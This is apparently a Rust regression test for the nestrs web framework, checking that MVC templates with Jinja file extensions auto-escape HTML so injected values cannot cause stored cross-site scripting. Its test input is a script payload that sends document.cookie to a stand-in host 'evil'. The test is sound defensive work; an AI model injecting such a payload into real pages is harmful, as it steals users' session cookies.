//! Regression: MVC templates must auto-escape regardless of file extension.
//!
//! minijinja's default auto-escape callback only escapes `.html`/`.htm`/`.xml`
//! template names. nestrs accepts the common Jinja naming conventions
//! (`.j2`, `.jinja`, `.mjinja`) — those would render user-supplied HTML
//! unescaped, a stored-XSS footgun. `MvcModule::for_root` therefore forces
//! `AutoEscape::Html` for every loaded template.
#![cfg(feature = "mvc")]

use nestrs::prelude::*;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

struct TempDir {
    path: PathBuf,
}

impl TempDir {
    fn new(label: &str) -> Self {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system time should be after unix epoch")
            .as_nanos();
        let path = std::env::temp_dir().join(format!("nestrs-{label}-{unique}"));
        fs::create_dir_all(&path).expect("temp dir should be creatable");
        Self { path }
    }

    fn path(&self) -> &Path {
        &self.path
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

#[test]
fn jinja_extension_templates_escape_html_injected_values() {
    let dir = TempDir::new("mvc-escape");
    // `.jinja` — minijinja's default callback would treat this as AutoEscape::None.
    fs::write(
        dir.path().join("profile.jinja"),
        "<h1>{{ name }}</h1><p>{{ bio }}</p>",
    )
    .expect("template should be written");

    MvcModule::for_root(dir.path()).expect("root should load");
    let service = MvcService;

    #[derive(serde::Serialize)]
    struct Ctx {
        name: &'static str,
        bio: &'static str,
    }

    let rendered = service
        .render(
            "profile.jinja",
            Ctx {
                name: "Ada",
                bio: "<script>fetch('//evil/'+document.cookie)</script>",
            },
        )
        .expect("template should render");

    assert!(
        !rendered.contains("<script"),
        "user-supplied HTML must be escaped in .jinja templates; got: {rendered}"
    );
    assert!(
        rendered.contains("&lt;script&gt;"),
        "the script tag must appear HTML-escaped; got: {rendered}"
    );
}
